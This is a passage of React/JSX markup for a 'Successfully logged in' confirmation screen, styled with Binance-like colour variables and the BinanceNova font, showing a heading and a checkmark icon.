        <div 
          className="mb-6"
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Successfully logged in
        </div>
        
        <div className="mb-8">
          <svg 
            width="64" 
            height="64" 
            viewBox="0 0 64 64" 
            className="mx-auto"
            style={{ color: "var(--color-BtnBg, #FCD535)" }}
            fill="currentColor"
          >
            <circle cx="32" cy="32" r="32" />
            <path d="M20 32l8 8 16-16" stroke="#202630" strokeWidth="3" fill="none" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>
        
        <div 
          style={{ 
            color: "var(--color-SecondaryText, #B7BDC6)",
            fontFamily: "BinanceNova, Arial
